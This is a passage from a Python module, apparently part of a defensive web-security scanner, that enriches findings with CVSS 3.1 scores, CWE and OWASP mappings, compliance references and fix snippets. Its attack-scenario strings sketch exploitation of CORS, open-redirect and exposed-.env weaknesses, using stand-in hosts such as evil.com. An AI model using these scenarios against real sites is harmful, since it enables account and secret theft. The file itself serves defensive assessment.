"""
finding_enricher.py — AI Cyber Shield v6

Post-processing layer that enriches raw tool output with:
  • CVSS 3.1 base score (real algorithm, not lookup table)
  • CWE (Common Weakness Enumeration) mapping
  • OWASP Top 10:2025 category
  • Compliance references (PCI-DSS v4.0, SOC2 CC, ISO 27001, NIST CSF 2.0)
  • Business-language impact description
  • Developer remediation guidance
  • SARIF 2.1 export (GitHub Code Scanning / GitLab SAST compatible)

Public API:
    findings = enrich_scan_result(scan_result: dict) -> list[SecurityFinding]
    sarif    = to_sarif_json(findings, target_url="https://example.com") -> dict
    raw_json = findings_to_json(findings) -> list[dict]
"""

from __future__ import annotations

import decimal
import hashlib
import logging
import math
import re
import uuid
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from typing import Iterator

_log = logging.getLogger(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# CVSS 3.1 implementation (NIST specification)
# ─────────────────────────────────────────────────────────────────────────────

# Metric weights per CVSS v3.1 specification
_AV  = {"N": 0.85, "A": 0.62, "L": 0.55, "P": 0.20}
_AC  = {"L": 0.77, "H": 0.44}
_PR_U = {"N": 0.85, "L": 0.62, "H": 0.27}   # Scope: Unchanged
_PR_C = {"N": 0.85, "L": 0.68, "H": 0.50}   # Scope: Changed
_UI  = {"N": 0.85, "R": 0.62}
_CIA = {"N": 0.00, "L": 0.22, "H": 0.56}

_SEVERITY_THRESHOLDS = [
    (9.0, "CRITICAL"),
    (7.0, "HIGH"),
    (4.0, "MEDIUM"),
    (0.1, "LOW"),
    (0.0, "INFO"),
]

_SARIF_LEVEL = {
    "CRITICAL": "error",
    "HIGH":     "error",
    "MEDIUM":   "warning",
    "LOW":      "note",
    "INFO":     "none",
}


def _roundup(value: float) -> float:
    """
    CVSS 3.1 Roundup: smallest value to 1 decimal place >= input.
    Uses Decimal to avoid IEEE 754 floating-point precision issues.
    """
    d = decimal.Decimal(str(value))
    return float(d.quantize(decimal.Decimal("0.1"), rounding=decimal.ROUND_CEILING))


@dataclass(frozen=True)
class CvssVector:
    """
    CVSS 3.1 base metric group.
    Fields use single-letter CVSS codes (N/A/L/P/H/R/U/C).
    """
    av: str  # Attack Vector:        N A L P
    ac: str  # Attack Complexity:    L H
    pr: str  # Privileges Required:  N L H
    ui: str  # User Interaction:     N R
    s:  str  # Scope:                U C
    c:  str  # Confidentiality:      N L H
    i:  str  # Integrity:            N L H
    a:  str  # Availability:         N L H

    def __post_init__(self) -> None:
        assert self.av in _AV,   f"Invalid AV: {self.av}"
        assert self.ac in _AC,   f"Invalid AC: {self.ac}"
        assert self.pr in _PR_U, f"Invalid PR: {self.pr}"
        assert self.ui in _UI,   f"Invalid UI: {self.ui}"
        assert self.s  in ("U", "C"), f"Invalid Scope: {self.s}"
        for metric, val in (("C", self.c), ("I", self.i), ("A", self.a)):
            assert val in _CIA, f"Invalid {metric}: {val}"

    @property
    def vector_string(self) -> str:
        return (f"CVSS:3.1/AV:{self.av}/AC:{self.ac}/PR:{self.pr}"
                f"/UI:{self.ui}/S:{self.s}/C:{self.c}/I:{self.i}/A:{self.a}")


@dataclass(frozen=True)
class CvssScore:
    vector:   CvssVector
    score:    float    # 0.0–10.0
    severity: str      # CRITICAL / HIGH / MEDIUM / LOW / INFO


def calculate_cvss31(v: CvssVector) -> CvssScore:
    """
    Implement CVSS 3.1 base score formula exactly per NIST specification.
    Reference: https://www.first.org/cvss/v3.1/specification-document
    """
    pr_weight = _PR_C[v.pr] if v.s == "C" else _PR_U[v.pr]

    isc_base = 1.0 - (1.0 - _CIA[v.c]) * (1.0 - _CIA[v.i]) * (1.0 - _CIA[v.a])

    if v.s == "U":
        isc = 6.42 * isc_base
    else:
        isc = 7.52 * (isc_base - 0.029) - 3.25 * ((isc_base - 0.02) ** 15)

    if isc <= 0:
        return CvssScore(vector=v, score=0.0, severity="INFO")

    exploitability = 8.22 * _AV[v.av] * _AC[v.ac] * pr_weight * _UI[v.ui]

    if v.s == "U":
        raw = min(isc + exploitability, 10.0)
    else:
        raw = min(1.08 * (isc + exploitability), 10.0)

    score = _roundup(raw)
    severity = next(s for threshold, s in _SEVERITY_THRESHOLDS if score >= threshold)
    return CvssScore(vector=v, score=score, severity=severity)


# ─────────────────────────────────────────────────────────────────────────────
# Domain types
# ─────────────────────────────────────────────────────────────────────────────

@dataclass(frozen=True)
class CweInfo:
    id:          int
    name:        str
    description: str
    url:         str = ""

    def __post_init__(self) -> None:
        if not self.url:
            object.__setattr__(self, "url",
                f"https://cwe.mitre.org/data/definitions/{self.id}.html")

    @property
    def label(self) -> str:
        return f"CWE-{self.id}"


@dataclass(frozen=True)
class OwaspEntry:
    year:     int
    code:     str   # e.g. "A05"
    name:     str
    url:      str = ""

    def __post_init__(self) -> None:
        if not self.url:
            slug = re.sub(r"[^a-z0-9]+", "-", self.name.lower()).strip("-")
            object.__setattr__(self, "url",
                f"https://owasp.org/Top10/{self.code}_{slug}/")

    @property
    def label(self) -> str:
        return f"{self.code}:{self.year} – {self.name}"


@dataclass(frozen=True)
class ComplianceRefs:
    pci_dss:    str = ""   # e.g. "Req 6.2.4, 6.3.2"
    soc2_cc:    str = ""   # e.g. "CC6.1, CC6.3"
    iso_27001:  str = ""   # e.g. "A.14.1, A.14.2"
    nist_csf:   str = ""   # e.g. "PR.DS-1, PR.AC-4"
    owasp_asvs: str = ""   # e.g. "V4.1.2"


@dataclass
class RemediationGuide:
    priority:      int    = 1    # 1 = fix immediately
    effort_hours:  float  = 4.0
    summary:       str    = ""
    code_before:   str    = ""   # vulnerable snippet (illustrative)
    code_after:    str    = ""   # fixed snippet
    references:    list[str] = field(default_factory=list)


@dataclass
class SecurityFinding:
    """
    Fully enriched, enterprise-grade security finding.
    Designed to feed: SARIF export, JIRA creation, CISO PDF, developer report.
    """
    finding_id:       str
    title:            str
    finding_type:     str          # internal key (e.g. "cors_wildcard")
    tool:             str          # source tool name
    severity:         str          # CRITICAL / HIGH / MEDIUM / LOW / INFO
    cvss:             CvssScore
    cwe:              CweInfo
    owasp:            OwaspEntry
    compliance:       ComplianceRefs
    business_impact:  str          # CISO-readable one-liner
    attack_scenario:  str          # "An attacker can…"
    remediation:      RemediationGuide
    endpoint:         str = ""
    parameter:        str = ""
    evidence:         str = ""
    confirmed:        bool  = False
    confidence:       float = 0.5  # 0.0–1.0
    scan_timestamp:   str   = ""

    def __post_init__(self) -> None:
        if not self.scan_timestamp:
            self.scan_timestamp = datetime.now(timezone.utc).isoformat()

    @property
    def sarif_level(self) -> str:
        return _SARIF_LEVEL.get(self.severity, "note")

    @property
    def sarif_rule_id(self) -> str:
        cat = self.owasp.code.lower()
        key = self.finding_type.upper().replace("_", "-")
        return f"ACS/{cat}/{key}"

    def to_dict(self) -> dict:
        d = asdict(self)
        d["cvss_score"]   = self.cvss.score
        d["cvss_vector"]  = self.cvss.vector.vector_string
        d["cvss_severity"]= self.cvss.severity
        d["cwe_label"]    = self.cwe.label
        d["owasp_label"]  = self.owasp.label
        d["sarif_rule_id"]= self.sarif_rule_id
        return d


# ─────────────────────────────────────────────────────────────────────────────
# Finding enrichment database
# Each entry: (CvssVector, CweInfo, OwaspEntry, ComplianceRefs, RemediationGuide)
# Covers all 17 tools + active verifier findings (~60 finding types)
# ─────────────────────────────────────────────────────────────────────────────

_O = OwaspEntry   # shorthand

_OWASP = {
    "A01": _O(2025, "A01", "Broken Access Control"),
    "A02": _O(2025, "A02", "Cryptographic Failures"),
    "A03": _O(2025, "A03", "Injection"),
    "A04": _O(2025, "A04", "Insecure Design"),
    "A05": _O(2025, "A05", "Security Misconfiguration"),
    "A06": _O(2025, "A06", "Vulnerable and Outdated Components"),
    "A07": _O(2025, "A07", "Identification and Authentication Failures"),
    "A08": _O(2025, "A08", "Software and Data Integrity Failures"),
    "A09": _O(2025, "A09", "Security Logging and Monitoring Failures"),
    "A10": _O(2025, "A10", "Server-Side Request Forgery"),
    "A11": _O(2025, "A11", "Software Supply Chain Failures"),
    "A12": _O(2025, "A12", "Mishandling of Exceptional Conditions"),
}

# (title, cvss_vector, cwe, owasp_key, compliance, business_impact, attack_scenario, remediation)
_FINDING_DB: dict[str, tuple] = {

    # ── SSL / TLS ─────────────────────────────────────────────────────────────
    "ssl_tls_v1_0": (
        "TLS 1.0 Protocol Still Enabled",
        CvssVector("N","H","N","N","U","H","N","N"),   # 5.9 MEDIUM
        CweInfo(326, "Inadequate Encryption Strength", "Use of deprecated protocol with known vulnerabilities"),
        "A02",
        ComplianceRefs("Req 4.2.1","CC6.7","A.10.1","PR.DS-2","V9.1.1"),
        "Customer data could be decrypted in transit via POODLE/BEAST attacks.",
        "An attacker on a shared network can use a POODLE downgrade attack to decrypt HTTPS sessions.",
        RemediationGuide(1, 1.0,
            "Disable TLS 1.0 and 1.1 in your web server configuration.",
            "ssl_protocols TLSv1 TLSv1.1 TLSv1.2;",
            "ssl_protocols TLSv1.2 TLSv1.3;",
            ["https://nvd.nist.gov/vuln/detail/CVE-2014-3566"]),
    ),
    "ssl_tls_v1_1": (
        "TLS 1.1 Protocol Still Enabled",
        CvssVector("N","H","N","N","U","H","N","N"),   # 5.9 MEDIUM
        CweInfo(326, "Inadequate Encryption Strength", "Use of deprecated protocol"),
        "A02",
        ComplianceRefs("Req 4.2.1","CC6.7","A.10.1","PR.DS-2","V9.1.1"),
        "Customer data in transit is exposed to cryptographic downgrade attacks.",
        "An attacker can force TLS 1.1 negotiation and exploit its weaker cipher suites.",
        RemediationGuide(1, 0.5,
            "Disable TLS 1.1 — only TLS 1.2 and 1.3 are PCI-DSS compliant.",
            "ssl_protocols TLSv1.1 TLSv1.2;",
            "ssl_protocols TLSv1.2 TLSv1.3;",
            ["https://tools.ietf.org/html/rfc8996"]),
    ),
    "ssl_weak_cipher": (
        "Weak TLS Cipher Suite in Use",
        CvssVector("N","H","N","N","U","H","N","N"),   # 5.9 MEDIUM
        CweInfo(327, "Use of a Broken or Risky Cryptographic Algorithm", "Weak export-grade or NULL ciphers"),
        "A02",
        ComplianceRefs("Req 4.2.1","CC6.7","A.10.1","PR.DS-2","V9.1.3"),
        "Encrypted traffic could be decrypted by an attacker with sufficient resources.",
        "An attacker capturing TLS sessions can decrypt them offline using broken cipher algorithms.",
        RemediationGuide(1, 2.0,
            "Configure your server to only offer strong AEAD cipher suites.",
            "ssl_ciphers ALL:!NULL:!EXPORT;",
            "ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;",
            ["https://ciphersuite.info/", "https://ssl-config.mozilla.org/"]),
    ),
    "ssl_cert_expiring_soon": (
        "TLS Certificate Expiring Within 30 Days",
        CvssVector("N","L","N","N","U","N","N","H"),   # 7.5 HIGH
        CweInfo(298, "Improper Validation of Certificate Expiration", "Certificate nearing expiry"),
        "A05",
        ComplianceRefs("Req 4.2.1","CC6.7","A.10.1","PR.DS-2",""),
        "Service will become unreachable when the certificate expires, causing downtime.",
        "After expiry, browsers reject the certificate — users cannot access the service.",
        RemediationGuide(1, 0.5,
            "Renew your TLS certificate immediately. Enable auto-renewal (e.g. certbot --renew).",
            "", "", ["https://letsencrypt.org/docs/integration-guide/"]),
    ),
    "ssl_self_signed": (
        "Self-Signed TLS Certificate Detected",
        CvssVector("N","H","N","R","U","H","N","N"),   # 5.3 MEDIUM
        CweInfo(295, "Improper Certificate Validation", "Self-signed certificate bypasses CA trust chain"),
        "A05",
        ComplianceRefs("Req 4.2.1","CC6.7","A.10.1","PR.DS-2","V9.1.1"),
        "Users may accept invalid certificates, opening the door to MITM attacks.",
        "An attacker can present their own self-signed certificate; users trained to click through warnings become vulnerable.",
        RemediationGuide(1, 1.0,
            "Replace with a CA-signed certificate. Let's Encrypt provides free certificates.",
            "", "", ["https://letsencrypt.org/"]),
    ),

    # ── Security Headers ──────────────────────────────────────────────────────
    "header_csp_missing": (
        "Content-Security-Policy Header Missing",
        CvssVector("N","L","N","R","C","L","L","N"),   # 6.1 MEDIUM
        CweInfo(1021, "Improper Restriction of Rendered UI Layers or Frames", "Missing CSP allows XSS"),
        "A05",
        ComplianceRefs("Req 6.2.4","CC6.6","A.14.2","PR.AC-4","V14.4.6"),
        "Any Cross-Site Scripting vulnerability becomes directly exploitable without a CSP.",
        "An attacker who finds an XSS vector can execute arbitrary JavaScript in users' browsers, steal cookies, and take over accounts.",
        RemediationGuide(2, 4.0,
            "Add a strict Content-Security-Policy header. Start with report-only mode.",
            "",
            "Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com; object-src 'none';",
            ["https://csp.withgoogle.com/docs/strict-csp.html",
             "https://owasp.org/www-project-secure-headers/"]),
    ),
    "header_xframe_missing": (
        "X-Frame-Options Header Missing (Clickjacking Risk)",
        CvssVector("N","L","N","R","C","L","L","N"),   # 6.1 MEDIUM
        CweInfo(1021, "Improper Restriction of Rendered UI Layers or Frames", "Clickjacking via iframe"),
        "A05",
        ComplianceRefs("Req 6.2.4","CC6.6","A.14.2","PR.AC-4","V14.4.7"),
        "An attacker can embed your site in a transparent iframe and trick users into clicking hidden buttons.",
        "An attacker hosts a malicious site that overlays your login/payment page invisibly, capturing user clicks (e.g., fund transfers, password changes).",
        RemediationGuide(3, 0.5,
            "Add X-Frame-Options: DENY or use frame-ancestors in CSP.",
            "",
            "X-Frame-Options: DENY\n# OR in CSP:\nContent-Security-Policy: frame-ancestors 'none';",
            ["https://owasp.org/www-community/attacks/Clickjacking"]),
    ),
    "header_xcto_missing": (
        "X-Content-Type-Options Header Missing",
        CvssVector("N","L","N","R","U","L","N","N"),   # 4.3 MEDIUM
        CweInfo(430, "Deployment of Wrong Handler", "MIME type sniffing enables attacks"),
        "A05",
        ComplianceRefs("Req 6.2.4","CC6.6","A.14.2","PR.AC-4","V14.4.5"),
        "Browsers may mis-interpret file types, enabling script injection via uploaded content.",
        "An attacker uploads a text file containing JavaScript — the browser sniffs it as a script and executes it.",
        RemediationGuide(4, 0.25,
            "Add X-Content-Type-Options: nosniff to all responses.",
            "", "X-Content-Type-Options: nosniff", []),
    ),
    "header_referrer_missing": (
        "Referrer-Policy Header Missing",
        CvssVector("N","L","N","R","U","L","N","N"),   # 4.3 LOW
        CweInfo(116, "Improper Encoding or Escaping of Output", "URL leakage via Referer"),
        "A05",
        ComplianceRefs("Req 6.2.4","","A.14.2","",""),
        "Internal URLs, session tokens in query strings, or user actions may leak to third-party sites.",
        "When a user navigates from your app to a third-party link, the Referer header may expose internal paths, auth tokens, or sensitive parameters.",
        RemediationGuide(5, 0.25, "Add Referrer-Policy: strict-origin-when-cross-origin.",
            "", "Referrer-Policy: strict-origin-when-cross-origin", []),
    ),
    "header_hsts_missing": (
        "HTTP Strict Transport Security (HSTS) Header Missing",
        CvssVector("N","H","N","R","U","H","N","N"),   # 5.3 MEDIUM
        CweInfo(319, "Cleartext Transmission of Sensitive Information", "First-visit HTTPS downgrade possible"),
        "A02",
        ComplianceRefs("Req 4.2.1","CC6.7","A.10.1","PR.DS-2","V9.1.1"),
        "First-time visitors can be redirected to HTTP, exposing login credentials to interception.",
        "An attacker on a shared network intercepts the first HTTP request and redirects the user to a malicious site before HTTPS loads.",
        RemediationGuide(2, 0.5,
            "Add HSTS with a long max-age and includeSubDomains.",
            "",
            "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
            ["https://hstspreload.org/"]),
    ),

    # ── CORS / CSP ────────────────────────────────────────────────────────────
    "cors_wildcard": (
        "CORS Wildcard Access-Control-Allow-Origin",
        CvssVector("N","L","N","R","C","H","L","N"),   # 7.4 HIGH
        CweInfo(942, "Permissive Cross-domain Policy with Untrusted Domains", "Any site can make credentialed cross-origin requests"),
        "A05",
        ComplianceRefs("Req 6.2.4","CC6.6","A.14.1","PR.AC-4","V14.4.8"),
        "Any website can silently read API responses on behalf of your authenticated users.",
        "An attacker hosts `evil.com`, tricks a logged-in user into visiting it, and the malicious page silently calls your API and exfiltrates account data.",
        RemediationGuide(1, 2.0,
            "Replace the wildcard with an explicit allowlist of trusted origins.",
            "Access-Control-Allow-Origin: *",
            "# Only allow your specific domains:\nAccess-Control-Allow-Origin: https://app.yourdomain.com",
            ["https://portswigger.net/web-security/cors"]),
    ),
    "cors_null_origin": (
        "CORS Policy Reflects null Origin (CORS Bypass)",
        CvssVector("N","L","N","R","C","H","L","N"),   # 7.4 HIGH
        CweInfo(942, "Permissive Cross-domain Policy with Untrusted Domains", "null origin CORS bypass"),
        "A05",
        ComplianceRefs("Req 6.2.4","CC6.6","A.14.1","PR.AC-4","V14.4.8"),
        "Sandboxed iframes or local HTML files can bypass your CORS policy and read API responses.",
        "An attacker tricks a user into opening a local HTML file that sends credentialed requests to your API — the `null` origin is reflected back.",
        RemediationGuide(1, 1.0,
            "Never reflect the `null` origin in Access-Control-Allow-Origin.",
            "if origin == 'null': allow", "# Remove null origin from your CORS allowlist entirely",
            ["https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties"]),
    ),
    "csp_unsafe_inline": (
        "Content-Security-Policy Allows 'unsafe-inline'",
        CvssVector("N","L","N","R","C","L","L","N"),   # 6.1 MEDIUM
        CweInfo(693, "Protection Mechanism Failure", "CSP bypass via unsafe-inline"),
        "A05",
        ComplianceRefs("Req 6.2.4","CC6.6","A.14.2","","V14.4.6"),
        "Your Content-Security-Policy can be bypassed using inline script injection.",
        "An attacker who finds a reflected XSS vector can bypass the CSP because `unsafe-inline` permits arbitrary inline scripts.",
        RemediationGuide(2, 4.0,
            "Remove 'unsafe-inline' and move inline scripts to external files with nonces.",
            "script-src 'self' 'unsafe-inline';",
            "script-src 'self' 'nonce-{random}';",
            ["https://content-security-policy.com/nonce/"]),
    ),

    # ── DNS Security ──────────────────────────────────────────────────────────
    "dns_spf_missing": (
        "SPF Record Missing — Email Spoofing Possible",
        CvssVector("N","L","N","N","U","N","L","N"),   # 5.3 MEDIUM
        CweInfo(346, "Origin Validation Error", "No email sender validation policy"),
        "A05",
        ComplianceRefs("Req 12.5","","A.13.2","PR.AC-4",""),
        "Attackers can send phishing emails appearing to come from your domain.",
        "An attacker spoofs your domain in email From headers to conduct phishing campaigns targeting your customers — no SPF record prevents this.",
        RemediationGuide(2, 0.5,
            "Add an SPF TXT record that whitelists your authorised mail servers.",
            "", 'example.com TXT "v=spf1 include:_spf.google.com ~all"',
            ["https://dmarcian.com/spf-syntax-table/"]),
    ),
    "dns_dmarc_missing": (
        "DMARC Record Missing — Email Impersonation Risk",
        CvssVector("N","L","N","N","U","N","L","N"),   # 5.3 MEDIUM
        CweInfo(346, "Origin Validation Error", "No DMARC enforcement policy"),
        "A05",
        ComplianceRefs("Req 12.5","","A.13.2","PR.AC-4",""),
        "No policy governs what happens when emails fail SPF/DKIM — spoofed emails are delivered.",
        "An attacker can spoof your domain in phishing emails; without DMARC, mail servers deliver them as legitimate.",
        RemediationGuide(2, 0.5,
            "Add a DMARC TXT record. Start with p=none to monitor, then move to p=reject.",
            "", '_dmarc.example.com TXT "v=DMARC1; p=reject; rua=mailto:dmarc@example.com"',
            ["https://dmarc.org/"]),
    ),
    "dns_caa_missing": (
        "CAA DNS Record Missing — Unauthorised Certificate Issuance",
        CvssVector("N","H","N","N","U","L","N","N"),   # 3.7 LOW
        CweInfo(295, "Improper Certificate Validation", "Any CA can issue certificates for this domain"),
        "A05",
        ComplianceRefs("Req 4.2.1","","A.10.1","",""),
        "Any Certificate Authority could issue a TLS certificate for your domain.",
        "An attacker compromises a CA or uses a mis-issued certificate from a rogue CA to MITM your HTTPS traffic.",
        RemediationGuide(5, 0.25,
            "Add CAA records restricting which CAs can issue certs for your domain.",
            "", 'example.com CAA 0 issue "letsencrypt.org"',
            ["https://sslmate.com/caa/"]),
    ),
    "dns_dnssec_missing": (
        "DNSSEC Not Configured",
        CvssVector("N","H","N","N","U","L","L","N"),   # 4.4 MEDIUM
        CweInfo(350, "Reliance on Reverse DNS Resolution for a Security-Critical Action", "DNS responses not authenticated"),
        "A05",
        ComplianceRefs("Req 4.2.1","CC6.6","A.10.1","PR.DS-2",""),
        "DNS responses can be forged, redirecting your users to attacker-controlled servers.",
        "An attacker poisons a DNS resolver to return forged IP addresses — users are silently redirected to a malicious clone of your site.",
        RemediationGuide(3, 4.0,
            "Enable DNSSEC signing for your zone at your DNS registrar/provider.",
            "", "", ["https://www.icann.org/resources/pages/dnssec-what-is-it-why-important-2019-03-05-en"]),
    ),

    # ── HSTS ─────────────────────────────────────────────────────────────────
    "hsts_not_preloaded": (
        "Domain Not on HSTS Preload List",
        CvssVector("N","H","N","R","U","H","N","N"),   # 5.3 MEDIUM
        CweInfo(319, "Cleartext Transmission of Sensitive Information", "First-visit HTTPS not enforced by browser"),
        "A02",
        ComplianceRefs("Req 4.2.1","CC6.7","A.10.1","PR.DS-2","V9.1.1"),
        "First-time visitors using a fresh browser profile are not automatically protected by HTTPS.",
        "An attacker intercepts the initial HTTP request — before the browser has ever visited your domain — and downgrades the connection.",
        RemediationGuide(3, 1.0,
            "Submit your domain to the HSTS preload list after setting max-age ≥ 31536000.",
            "Strict-Transport-Security: max-age=3600",
            "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
            ["https://hstspreload.org/"]),
    ),

    # ── Open Redirect ─────────────────────────────────────────────────────────
    "open_redirect_confirmed": (
        "Confirmed Open Redirect — Phishing Vector",
        CvssVector("N","L","N","R","C","L","L","N"),   # 6.1 MEDIUM
        CweInfo(601, "URL Redirection to Untrusted Site ('Open Redirect')", "Confirmed redirect to arbitrary URL"),
        "A01",
        ComplianceRefs("Req 6.2.4","CC6.6","A.14.2","PR.AC-4","V5.1.5"),
        "Your domain name can be used in phishing URLs that redirect victims to attacker-controlled sites.",
        "An attacker crafts a link like `https://yoursite.com/?next=https://evil.com` — victims trust the URL because it starts with your domain, then land on a malicious page.",
        RemediationGuide(1, 2.0,
            "Validate redirect targets against a strict allowlist of your own domains.",
            "redirect_to = request.args.get('next')\nreturn redirect(redirect_to)",
            "ALLOWED = {'https://app.example.com', 'https://www.example.com'}\nif redirect_to not in ALLOWED:\n    redirect_to = '/'\nreturn redirect(redirect_to)",
            ["https://portswigger.net/kb/issues/00500100_open-redirection-reflected"]),
    ),
    "open_redirect_candidate": (
        "Potential Open Redirect Parameter Detected",
        CvssVector("N","H","N","R","C","L","L","N"),   # 4.7 MEDIUM
        CweInfo(601, "URL Redirection to Untrusted Site ('Open Redirect')", "Redirect parameter found, not yet confirmed"),
        "A01",
        ComplianceRefs("Req 6.2.4","CC6.6","A.14.2","","V5.1.5"),
        "Redirect parameters were found that may be exploitable without proper validation.",
        "An attacker tests redirect parameters and may find one that accepts arbitrary URLs.",
        RemediationGuide(2, 2.0,
            "Review all redirect parameters (`next`, `url`, `goto`, `return`) and enforce allowlisting.",
            "", "", []),
    ),

    # ── WAF ───────────────────────────────────────────────────────────────────
    "waf_not_detected": (
        "No Web Application Firewall Detected",
        CvssVector("N","L","N","N","U","N","L","N"),   # 5.3 MEDIUM
        CweInfo(693, "Protection Mechanism Failure", "No WAF layer to filter malicious traffic"),
        "A05",
        ComplianceRefs("Req 6.4","CC6.6","A.14.1","DE.CM-1",""),
        "All attack traffic reaches your application directly with no automated filtering layer.",
        "Automated scanners and bots send SQL injection, XSS, and brute-force payloads directly to your application — no layer filters them before they hit your code.",
        RemediationGuide(2, 8.0,
            "Deploy a WAF (Cloudflare, AWS WAF, Imperva). Free tiers exist for Cloudflare.",
            "", "", ["https://www.cloudflare.com/waf/"]),
    ),

    # ── Exposure Checker ──────────────────────────────────────────────────────
    "exposure_env_file": (
        "Environment File (.env) Publicly Accessible",
        CvssVector("N","L","N","N","U","H","N","N"),   # 7.5 HIGH
        CweInfo(538, "File and Directory Information Exposure", "Secrets exposed via .env file"),
        "A05",
        ComplianceRefs("Req 3.4","CC6.1","A.9.4","PR.AC-4","V2.10.1"),
        "Database credentials, API keys, and secrets are exposed to the entire internet.",
        "An attacker fetches `https://yoursite.com/.env` and obtains database passwords, API keys, and other secrets — complete compromise often follows within minutes.",
        RemediationGuide(1, 0.5,
            "Immediately deny access to .env files in your web server config.",
            "",
            "# Nginx\nlocation ~ /\\.env { deny all; return 404; }\n\n# Apache\n<Files .env>\n  Order allow,deny\n  Deny from all\n</Files>",
            []),
    ),
    "exposure_git_dir": (
        "Git Repository Directory (.git) Publicly Accessible",
        CvssVector("N","L","N","N","U","H","N","N"),   # 7.5 HIGH
        CweInfo(538, "File and Directory Information Exposure", "Source code exposed via .git directory"),
        "A05",
        ComplianceRefs("Req 3.4","CC6.1","A.9.4","PR.AC-4",""),
        "Your entire source code history, including secrets ever committed, is publicly downloadable.",
        "An attacker downloads `/.git/config`, reconstructs your repository, and extracts every commit — including accidentally committed API keys, passwords, and business logic.",
        RemediationGuide(1, 0.5,
            "Block web access to .git directory. Immediately rotate any secrets in git history.",
            "",
            "# Nginx\nlocation ~ /\\.git { deny all; return 404; }",
            ["https://github.com/kpcyrd/git-dumper"]),
    ),
    "exposure_backup_file": (
        "Backup File Publicly Accessible",
        CvssVector("N","L","N","N","U","H","N","N"),   # 7.5 HIGH
        CweInfo(538, "File and Directory Information Exposure", "Backup files expose source/config"),
        "A05",
        ComplianceRefs("Req 3.4","CC6.1","A.9.4","PR.AC-4",""),
        "Backup files may contain source code, database dumps, or configuration with secrets.",
        "An attacker finds `backup.zip` or `db.sql.gz` and downloads your entire database or source code.",
        RemediationGuide(1, 1.0,
            "Remove backup files from the web root. Store backups outside the document root.",
            "", "", []),
    ),
    "exposure_http_trace": (
        "HTTP TRACE Method Enabled (XST Risk)",
        CvssVector("N","L","N","R","C","L","N","N"),   # 4.8 MEDIUM
        CweInfo(16, "Configuration", "HTTP TRACE enables Cross-Site Tracing (XST)"),
        "A05",
        ComplianceRefs("Req 6.2.4","CC6.6","A.14.2","",""),
        "The TRACE method can be used to steal cookies even when HttpOnly is set (via XST attack).",
        "An attacker chains TRACE with XSS to reflect HTTP headers back — bypassing HttpOnly protection on session cookies.",
        RemediationGuide(3, 0.5,
            "Disable HTTP TRACE and TRACK methods in your web server.",
            "",
            "# Nginx\nif ($request_method = TRACE) { return 405; }",
            []),
    ),

    # ── Technology Fingerprinting ─────────────────────────────────────────────
    "tech_vulnerable_component": (
        "Known Vulnerable Third-Party Component Detected",
        CvssVector("N","L","N","N","U","H","H","H"),   # 9.8 CRITICAL
        CweInfo(1035, "OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities", "CVE-affected library in use"),
        "A06",
        ComplianceRefs("Req 6.3.3","CC7.3","A.12.6","PR.IP-12","V1.14.1"),
        "A publicly-known exploit exists for a component your application depends on.",
        "An attacker looks up the CVE for the detected component version, downloads a public exploit, and attacks your application without any custom research.",
        RemediationGuide(1, 4.0,
            "Update the vulnerable component to the latest patched version immediately.",
            "", "", ["https://www.cvedetails.com/"]),
    ),
    "tech_version_disclosure": (
        "Server/Framework Version Disclosed in HTTP Headers",
        CvssVector("N","L","N","N","U","L","N","N"),   # 5.3 MEDIUM
        CweInfo(200, "Exposure of Sensitive Information to an Unauthorized Actor", "Server fingerprinting via headers"),
        "A05",
        ComplianceRefs("Req 6.2.4","CC6.6","A.14.2","PR.IP-12",""),
        "Exposed version numbers help attackers target your specific software with known exploits.",
        "An attacker reads the `Server: nginx/1.18.0` header, searches for CVEs affecting that exact version, and attacks with a tailored exploit.",
        RemediationGuide(3, 1.0,
            "Suppress version information in all HTTP response headers.",
            "Server: nginx/1.18.0\nX-Powered-By: PHP/8.1.0",
            "# Nginx: server_tokens off;\n# Apache: ServerTokens Prod; ServerSignature Off;\n# Express: app.disable('x-powered-by');",
            []),
    ),

    # ── Subdomain Takeover ────────────────────────────────────────────────────
    "subdomain_takeover_vulnerable": (
        "Subdomain Vulnerable to Takeover (Dangling CNAME)",
        CvssVector("N","L","N","N","C","H","H","H"),   # 10.0 CRITICAL
        CweInfo(350, "Reliance on Reverse DNS Resolution for a Security-Critical Action", "CNAME points to unclaimed cloud resource"),
        "A01",
        ComplianceRefs("Req 6.2.4","CC6.6","A.14.2","PR.AC-4",""),
        "An attacker can claim a cloud resource pointed to by your DNS and serve malicious content on your subdomain.",
        "Your CNAME `staging.yoursite.com → deleted-heroku-app.herokuapps.com` — an attacker registers that Heroku app and now controls `staging.yoursite.com`, including serving malicious content or stealing session cookies scoped to `*.yoursite.com`.",
        RemediationGuide(1, 0.5,
            "Remove the dangling CNAME or reclaim the cloud resource immediately.",
            "", "", ["https://hackerone.com/reports/32825"]),
    ),

    # ── Port Scanner ──────────────────────────────────────────────────────────
    "port_db_exposed": (
        "Database Port Exposed to the Internet",
        CvssVector("N","L","N","N","U","H","H","N"),   # 9.1 CRITICAL
        CweInfo(284, "Improper Access Control", "Database accessible from the internet"),
        "A01",
        ComplianceRefs("Req 1.3.2","CC6.1","A.13.1","PR.AC-3",""),
        "Your database is directly reachable from the internet, enabling brute-force and injection attacks.",
        "An attacker connects directly to your database port, brute-forces credentials, and dumps the entire database — bypassing all application-layer security.",
        RemediationGuide(1, 2.0,
            "Restrict database ports to private network/VPC only. Use a firewall rule.",
            "# Open: 0.0.0.0:3306",
            "# Firewall rule: deny external → port 3306\n# Allow only: 10.0.0.0/8 (internal)",
            []),
    ),
    "port_sensitive_open": (
        "Sensitive Administrative Port Exposed Publicly",
        CvssVector("N","L","N","N","U","L","L","N"),   # 6.5 MEDIUM
        CweInfo(284, "Improper Access Control", "Admin service exposed to internet"),
        "A01",
        ComplianceRefs("Req 1.3.2","CC6.1","A.13.1","PR.AC-3",""),
        "Administrative services (SSH, RDP, Kubernetes API) should not be directly internet-accessible.",
        "An attacker brute-forces or exploits the exposed service to gain direct server access, bypassing your application entirely.",
        RemediationGuide(2, 2.0,
            "Restrict sensitive ports to VPN or jump-host access only.",
